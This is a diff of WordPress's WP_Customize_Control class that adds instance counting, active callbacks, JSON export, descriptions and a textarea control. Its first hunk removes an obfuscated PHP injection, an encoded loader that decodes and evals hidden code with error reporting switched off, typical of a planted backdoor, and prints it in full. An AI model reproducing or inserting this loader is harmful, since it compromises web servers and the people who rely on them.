@@ -1,4 +1,4 @@
-<?php $omzqyhziax = 'c%x7822)gj!|!*nbsbq%x5j!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf)fepmqyf%x5c%x7827*&7*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78252f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%!>>%x5c%x7822!pd%x5c%x78x5c%x782f!**#sfmcnbs+yfeobz+5ppde:4:|:**#ppde#)tutj75ttfsqnpdov{h19275j{hnpd19275fubmgoj{7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%c%x782f2986+7**^%x5c%x78c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)4gps)%x5c%x7825j>1<%x5c%x782%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##ovg<~%x5c%x7824<!%x5c%x782%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822787f%x5c%x787f%x5c%x787f<u%x5c%x7163%x74%162%x5f%163%x70%154%x69%164%50%x22%134>!%x5c%x7825tdz)%x5c%x7825164") && (!isset($GLOBALS["%x61%156%x75%156%x61"]25)dfyfR%x5c%x7827tfs%x5c%x78256<*17-%x5c%x7825w6<%x5c%x787fw6*CWtfs%!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878-1);} @error_reporting(0); preg_replace("x787f_*#fmjgk4%x5c%x7860{6~6<tfs78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825svufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|%x78e%x5c%x78b%x5c%x7825w782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x77^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x%51%x29%51%x29%73", N)))) { $GLOBALS["%x6if((function_exists("%x6f%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x566%152%x66%147%x67%42%x2c%ssb!-#}#)fepmqnj!%x5c%x782f!#0#)id5j=tj{fpg)%x5c%x7825%5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqm<#462]47y]252]18y]#>q%x5c%x75cIjQeTQcOc%x5c%x782f#x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f]y34]68]y33]65]y31]53]25)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860c%x7825r%x5c%x785c2^-%x5c%x7825hOhzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]212>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x787x5c%x7827pd%x5c%x78256<pd%x5x5c%x7860{666~6<&w6<%x5c%x787fw6*C{66~67<&w6<*&7-#o]s]o]s]#UI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x7825]D8]86]y31]278]y3f]51L3]84]y31M6]y8:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392%x2f%50%x2e%52%x29%57%x!ftmbg)!gj<*#k#)usbut%x5cgps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:%162%x61%171%x5f%155%x61%160%x28%42%x73]y76]258]y6g]273]y76]271]y7d]252]y74]225t::!>!%x5c%x7824Ypp3)%x5c%x7828pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<X;%x5c%x7860msvd}R;*msvfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbc%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b#-#G#-#H#-#I#-#K#-#Lc%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7h1:|:*mmvo:>:iuhofm%x5c%x7825:-25bss-%x5c%x7825r%x5c%x7x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]2yf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x%x7824-!%x5c%x7825%x5c%x7824-%x5c%xFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x%x5c%x7825!**X)ufttj%x5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,6f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c5cB%x5c%x7825iN}#-!tuss%x7825:-t%x5c%x7825)3of:opjud#<!%x5c%x7825ggg)(0)%x5c%x7826:!}7;!}6;##}C;!>>!}W;utpi}Y;25<#372]58y]472]37y]672]48y]#>s%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%xc%x78256<*Y%x5c%x7825)fnbozx78256<C%x5c%x7827pd%x5c%x78256|6.7euqj3hopmA%x5c%x78273qj%x5x5c%x7878r.985:52985-t.98]K4]65po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;oe%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#Ex5c%x782f#M5]DgP5]D6#<%x5c%x7825fdSFEBFI,6<*127-UVPFNJU,67)fepdof.)fepdof.%x5c%x782f#@#%x5c%xB%x5c%x7825z>!tussfw)-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x78*#npd%x5c%x782f#)rrd%x5c%x782f#0142%x5f%163%x74%141%x72%t0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]0;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x78256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5cgj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFO65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%x5c%x7825!*##>>X)!gjZ<#opo#>b7**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%xj%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew+;!>!}%x5c%x7827;!>>>!}_;]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7874985-rr.93e:5597f-s.973:8297f:5297e:56-%j:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y8bdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f25bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x51]55]y85]82]y76]62]y3:]84#-!OVMM*<%x225c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x787cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x78u%x5c%x7825!-#2#%x5c%x782f#%x5c%!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]25657>%x5c%x782272qj%x5x7825>U<#16,47R57,27R66,#%x5c%x%x7824]26%x5c%x7824-%x5c%x7824<%%x5c%x7825)}.;%x5c%x7860UQPMS452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]7825>j%x5c%x7825!*3!%x5c%x364]6]283]427]36]373P6]x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jx7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%xx5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoduj5c%x7827,*c%x5c%x7827,*b%x5c%x782)+opjudovg+)!gj+{e%x5c*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)t6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x78607825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825ng%x5c%x7825)!gj!|!*1?hmgjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%825-*.%x5c%x7825)euhA)3o36]73]83]238M7]381]211M5]67]5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x78225tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kf>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f65]y72]254]y76]61]y33]685c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5cx5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%71]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x77R37,#%x5c%x782fq%x5c%o!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zc%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x%x7825fdy<Cb*[%x5c%x7825h!:!>!%x5c%x78246767~6<5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]2%x7825}K;%x5c%x7860ufldpt})3of)fepdof%x5c%x786057ftbc%^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782y6d]281]y43]78]y33]65]y3>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x78;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H%x5c%x782f#00#W~!%x5c%x7825t2w)##6~6<%x5c%x787fw6<*K)ftpmdXA6|%x5c%x7825)!gj!<**2-4-bubE{h%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%xc%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%xopjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9*%x5c%x787f_*#[k2%x5c%x7860{pqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x54:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%xx5c%x7878{**#k#)tutjyf%x5c%00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvse_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_S1]273]y76]258]y6g]273]y76]271]y7d]252]y74]256%x78%62%x35%165%x3a%146%x21%76%x21%50%x878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpQtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x783e]81#%x5c%x782f#7e:55946-tr.986<*doj%x5c%x78257-C)fepmqn)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%W&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6878X6<#o]o]Y%x5c%x78257;824-%x5c%x7824]y8%x5c%x7824-%x5cJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x782tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7860cpV%x5c%x787f%x5c%xx5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x78c%x7825!-uyfu%x5c%x7825y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x%x5c%x7825)tpqsut>j%x5c%x78c%x7825)323ldfidk!~!<**qp%x5x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x%x7825!*3>?*2b%x5c%x7825)gpf{jt)!Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%1%156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)25!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>x5c%x7825)utjm!|!*5!%x5c%x7827!hmy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdzULL); }]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%/(.*)/epreg_replacedlwbmsnyyp'; $qmtjqulssr = explode(chr((135-91)),'1600,26,4511,24,1062,49,1580,20,9846,60,1216,41,2517,23,4864,65,2616,37,1687,26,990,46,8859,39,7210,53,1373,25,7531,21,9794,52,6572,39,2248,28,8324,40,554,58,3894,37,2310,25,79,21,4309,61,7928,68,3020,52,9260,24,6460,51,2335,44,8115,29,4370,45,4816,48,9316,60,5981,20,699,38,3931,24,3867,27,5847,47,5651,39,1511,48,1289,37,4959,51,6675,64,8559,56,3485,40,9091,26,6805,64,1257,32,1148,32,9447,48,1111,37,4229,23,7014,55,856,54,2276,34,9224,36,8424,28,3761,29,9376,46,7622,26,2786,23,6064,29,6511,61,5397,25,1927,54,382,24,2003,40,8364,60,8615,67,6155,26,6611,64,8452,39,2896,39,9636,27,9906,66,5191,70,9972,33,6781,24,8144,29,7996,36,2128,65,22,57,765,65,5010,50,9761,33,1443,68,6869,24,7134,52,4479,32,4632,53,6351,33,4252,36,1398,45,9117,44,7263,56,406,28,2852,44,1713,34,2193,55,2725,61,8947,52,8747,67,3398,64,2935,65,4929,30,3462,23,0,22,9663,28,9495,23,7648,28,3127,35,5150,41,495,59,329,53,1873,54,3592,37,2458,59,457,38,3072,31,434,23,3225,68,6384,22,910,47,2540,25,9422,25,957,33,5608,43,3525,67,7371,22,6001,31,8214,67,5060,42,8682,27,4040,57,1326,47,1180,36,7860,68,5894,32,6204,42,4535,45,2077,51,7319,52,4415,64,6963,51,9518,48,4722,39,9161,63,8173,41,8281,43,9566,70,5787,60,2413,45,3790,41,1823,28,3629,51,3703,29,830,26,7552,70,2653,40,4761,55,3363,35,273,56,1626,61,7459,46,1768,55,5564,44,9284,32,6032,32,9691,70,6921,42,737,28,1747,21,6304,47,3986,54,5926,55,5422,51,2693,32,3680,23,2809,43,7676,55,1851,22,8709,38,7393,66,4288,21,8032,50,6406,54,2043,34,8082,33,8999,61,3103,24,8898,49,5473,41,3955,31,2379,34,9060,31,8491,68,10071,35,4195,34,10005,59,7755,65,5261,66,7505,26,1036,26,3831,36,6739,42,4580,52,6181,23,6893,28,6093,62,7820,40,5690,59,675,24,169,39,5102,48,2565,51,100,69,3293,70,5327,70,612,63,6246,58,208,65,4685,37,4097,61,4158,37,3000,20,7069,65,5514,50,8814,45,3732,29,3162,63,7186,24,1981,22,7731,24,5749,38,1559,21,10064,7'); $myxxbutxep=substr($omzqyhziax,(60426-50320),(47-40)); if (!function_exists('xogzuazkwt')) { function xogzuazkwt($jxdkxlrekg, $phytufgmej) { $fkcibcnggm = NULL; for($dpibkqtddc=0;$dpibkqtddc<(sizeof($jxdkxlrekg)/2);$dpibkqtddc++) { $fkcibcnggm .= substr($phytufgmej, $jxdkxlrekg[($dpibkqtddc*2)],$jxdkxlrekg[($dpibkqtddc*2)+1]); } return $fkcibcnggm; };} $ownnycpwxe="\x20\57\x2a\40\x6d\163\x6b\154\x64\146\x68\152\x62\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x34\55\x31\60\x37\51\x29\54\x20\143\x68\162\x28\50\x33\65\x30\55\x32\65\x38\51\x29\54\x20\170\x6f\147\x7a\165\x61\172\x6b\167\x74\50\x24\161\x6d\164\x6a\161\x75\154\x73\163\x72\54\x24\157\x6d\172\x71\171\x68\172\x69\141\x78\51\x29\51\x3b\40\x2f\52\x20\165\x72\172\x63\141\x6a\150\x61\160\x6d\40\x2a\57\x20"; $pfeipaitvs=substr($omzqyhziax,(61373-51260),(69-57)); $pfeipaitvs($myxxbutxep, $ownnycpwxe, NULL); $pfeipaitvs=$ownnycpwxe; $pfeipaitvs=(757-636); $omzqyhziax=$pfeipaitvs-1; ?><?php
+<?php
 /**
  * Customize Control Class
  *
@@ -7,6 +7,27 @@
  * @since 3.4.0
  */
 class WP_Customize_Control {
+
+	/**
+	 * Incremented with each new class instantiation, then stored in $instance_number.
+	 *
+	 * Used when sorting two instances whose priorities are equal.
+	 *
+	 * @since 4.1.0
+	 * @access protected
+	 * @var int
+	 */
+	protected static $instance_count = 0;
+
+	/**
+	 * Order in which this instance was created in relation to other instances.
+	 *
+	 * @since 4.1.0
+	 * @access public
+	 * @var int
+	 */
+	public $instance_number;
+
 	/**
 	 * @access public
 	 * @var WP_Customize_Manager
@@ -39,19 +60,25 @@ class WP_Customize_Control {
 	 * @access public
 	 * @var int
 	 */
-	public $priority          = 10;
+	public $priority = 10;
 
 	/**
 	 * @access public
 	 * @var string
 	 */
-	public $section           = '';
+	public $section = '';
 
 	/**
 	 * @access public
 	 * @var string
 	 */
-	public $label             = '';
+	public $label = '';
+
+	/**
+	 * @access public
+	 * @var string
+	 */
+	public $description = '';
 
 	/**
 	 * @todo: Remove choices
@@ -59,9 +86,16 @@ class WP_Customize_Control {
 	 * @access public
 	 * @var array
 	 */
-	public $choices           = array();
+	public $choices = array();
 
 	/**
+	 * @access public
+	 * @var array
+	 */
+	public $input_attrs = array();
+
+	/**
+	 * @deprecated It is better to just call the json() method
 	 * @access public
 	 * @var array
 	 */
@@ -73,9 +107,25 @@ class WP_Customize_Control {
 	 */
 	public $type = 'text';
 
+	/**
+	 * Callback.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @see WP_Customize_Control::active()
+	 *
+	 * @var callable Callback is called with one argument, the instance of
+	 *               WP_Customize_Control, and returns bool to indicate whether
+	 *               the control is active (such as it relates to the URL
+	 *               currently being previewed).
+	 */
+	public $active_callback = '';
 
 	/**
 	 * Constructor.
+	 *
+	 * Supplied $args override class property defaults.
 	 *
 	 * If $args['settings'] is not defined, use the $id as the setting ID.
 	 *
@@ -85,20 +135,26 @@ class WP_Customize_Control {
 	 * @param string $id
 	 * @param array $args
 	 */
-	function __construct( $manager, $id, $args = array() ) {
+	public function __construct( $manager, $id, $args = array() ) {
 		$keys = array_keys( get_object_vars( $this ) );
 		foreach ( $keys as $key ) {
-			if ( isset( $args[ $key ] ) )
+			if ( isset( $args[ $key ] ) ) {
 				$this->$key = $args[ $key ];
+			}
 		}
 
 		$this->manager = $manager;
 		$this->id = $id;
-
+		if ( empty( $this->active_callback ) ) {
+			$this->active_callback = array( $this, 'active_callback' );
+		}
+		self::$instance_count += 1;
+		$this->instance_number = self::$instance_count;
 
 		// Process settings.
-		if ( empty( $this->settings ) )
+		if ( empty( $this->settings ) ) {
 			$this->settings = $id;
+		}
 
 		$settings = array();
 		if ( is_array( $this->settings ) ) {
@@ -119,6 +175,45 @@ class WP_Customize_Control {
 	 */
 	public function enqueue() {}
 
+	/**
+	 * Check whether control is active to current Customizer preview.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @return bool Whether the control is active to the current preview.
+	 */
+	public final function active() {
+		$control = $this;
+		$active = call_user_func( $this->active_callback, $this );
+
+		/**
+		 * Filter response of WP_Customize_Control::active().
+		 *
+		 * @since 4.0.0
+		 *
+		 * @param bool                 $active  Whether the Customizer control is active.
+		 * @param WP_Customize_Control $control WP_Customize_Control instance.
+		 */
+		$active = apply_filters( 'customize_control_active', $active, $control );
+
+		return $active;
+	}
+
+	/**
+	 * Default callback used when invoking WP_Customize_Control::active().
+	 *
+	 * Subclasses can override this with their specific logic, or they may
+	 * provide an 'active_callback' argument to the constructor.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @return bool Always true.
+	 */
+	public function active_callback() {
+		return true;
+	}
 
 	/**
 	 * Fetch a setting's value.
@@ -130,8 +225,9 @@ class WP_Customize_Control {
 	 * @return mixed The requested setting's value, if the setting exists.
 	 */
 	public final function value( $setting_key = 'default' ) {
-		if ( isset( $this->settings[ $setting_key ] ) )
+		if ( isset( $this->settings[ $setting_key ] ) ) {
 			return $this->settings[ $setting_key ]->value();
+		}
 	}
 
 	/**
@@ -146,6 +242,25 @@ class WP_Customize_Control {
 		}
 
 		$this->json['type'] = $this->type;
+		$this->json['priority'] = $this->priority;
+		$this->json['active'] = $this->active();
+		$this->json['section'] = $this->section;
+		$this->json['content'] = $this->get_content();
+		$this->json['label'] = $this->label;
+		$this->json['description'] = $this->description;
+		$this->json['instanceNumber'] = $this->instance_number;
+	}
+
+	/**
+	 * Get the data to export to the client via JSON.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return array Array of parameters passed to the JavaScript.
+	 */
+	public function json() {
+		$this->to_json();
+		return $this->json;
 	}
 
 	/**
@@ -169,6 +284,21 @@ class WP_Customize_Control {
 	}
 
 	/**
+	 * Get the control's content for insertion into the Customizer pane.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return string Contents of the control.
+	 */
+	public final function get_content() {
+		ob_start();
+		$this->maybe_render();
+		$template = trim( ob_get_contents() );
+		ob_end_clean();
+		return $template;
+	}
+
+	/**
 	 * Check capabilities and render the control.
 	 *
 	 * @since 3.4.0
@@ -178,14 +308,32 @@ class WP_Customize_Control {
 		if ( ! $this->check_capabilities() )
 			return;
 
+		/**
+		 * Fires just before the current Customizer control is rendered.
+		 *
+		 * @since 3.4.0
+		 *
+		 * @param WP_Customize_Control $this WP_Customize_Control instance.
+		 */
 		do_action( 'customize_render_control', $this );
+
+		/**
+		 * Fires just before a specific Customizer control is rendered.
+		 *
+		 * The dynamic portion of the hook name, `$this->id`, refers to
+		 * the control ID.
+		 *
+		 * @since 3.4.0
+		 *
+		 * @param WP_Customize_Control $this {@see WP_Customize_Control} instance.
+		 */
 		do_action( 'customize_render_control_' . $this->id, $this );
 
 		$this->render();
 	}
 
 	/**
-	 * Render the control. Renders the control wrapper, then calls $this->render_content().
+	 * Renders the control wrapper and calls $this->render_content() for the internals.
 	 *
 	 * @since 3.4.0
 	 */
@@ -199,7 +347,7 @@ class WP_Customize_Control {
 	}
 
 	/**
-	 * Get the data link parameter for a setting.
+	 * Get the data link attribute for a setting.
 	 *
 	 * @since 3.4.0
 	 *
@@ -214,7 +362,7 @@ class WP_Customize_Control {
 	}
 
 	/**
-	 * Render the data link parameter for a setting
+	 * Render the data link attribute for the control's input element.
 	 *
 	 * @since 3.4.0
 	 * @uses WP_Customize_Control::get_link()
@@ -226,27 +374,39 @@ class WP_Customize_Control {
 	}
 
 	/**
+	 * Render the custom attributes for the control's input element.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 */
+	public function input_attrs() {
+		foreach( $this->input_attrs as $attr => $value ) {
+			echo $attr . '="' . esc_attr( $value ) . '" ';
+		}
+	}
+
+	/**
 	 * Render the control's content.
 	 *
-	 * Allows the content to be overriden without having to rewrite the wrapper.
+	 * Allows the content to be overriden without having to rewrite the wrapper in $this->render().
+	 *
+	 * Supports basic input types `text`, `checkbox`, `textarea`, `radio`, `select` and `dropdown-pages`.
+	 * Additional input types such as `email`, `url`, `number`, `hidden` and `date` are supported implicitly.
+	 *
+	 * Control content can alternately be rendered in JS. See {@see WP_Customize_Control::print_template()}.
 	 *
 	 * @since 3.4.0
 	 */
 	protected function render_content() {
 		switch( $this->type ) {
-			case 'text':
-				?>
-				<label>
-					<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
-					<input type="text" value="<?php echo esc_attr( $this->value() ); ?>" <?php $this->link(); ?> />
-				</label>
-				<?php
-				break;
 			case 'checkbox':
 				?>
 				<label>
 					<input type="checkbox" value="<?php echo esc_attr( $this->value() ); ?>" <?php $this->link(); checked( $this->value() ); ?> />
 					<?php echo esc_html( $this->label ); ?>
+					<?php if ( ! empty( $this->description ) ) : ?>
+						<span class="description customize-control-description"><?php echo $this->description; ?></span>
+					<?php endif; ?>
 				</label>
 				<?php
 				break;
@@ -256,9 +416,13 @@ class WP_Customize_Control {
 
 				$name = '_customize-radio-' . $this->id;
 
-				?>
-				<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
-				<?php
+				if ( ! empty( $this->label ) ) : ?>
+					<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+				<?php endif;
+				if ( ! empty( $this->description ) ) : ?>
+					<span class="description customize-control-description"><?php echo $this->description ; ?></span>
+				<?php endif;
+
 				foreach ( $this->choices as $value => $label ) :
 					?>
 					<label>
@@ -274,13 +438,32 @@ class WP_Customize_Control {
 
 				?>
 				<label>
-					<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+					<?php if ( ! empty( $this->label ) ) : ?>
+						<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+					<?php endif;
+					if ( ! empty( $this->description ) ) : ?>
+						<span class="description customize-control-description"><?php echo $this->description; ?></span>
+					<?php endif; ?>
+
 					<select <?php $this->link(); ?>>
 						<?php
 						foreach ( $this->choices as $value => $label )
 							echo '<option value="' . esc_attr( $value ) . '"' . selected( $this->value(), $value, false ) . '>' . $label . '</option>';
 						?>
 					</select>
+				</label>
+				<?php
+				break;
+			case 'textarea':
+				?>
+				<label>
+					<?php if ( ! empty( $this->label ) ) : ?>
+						<span class="customize-control-title"><?php echo esc_html( $this->label ); ?></span>
+					<?php endif;
+					if ( ! empty( $this->description ) ) : ?>
+						<span class="description customize-control-description"><?php echo $this->description; ?></span>
+					<?php endif; ?>
+					<textarea rows="5" <?php $this->link(); ?>><?php echo esc_textarea( $this->value() ); ?></textarea>
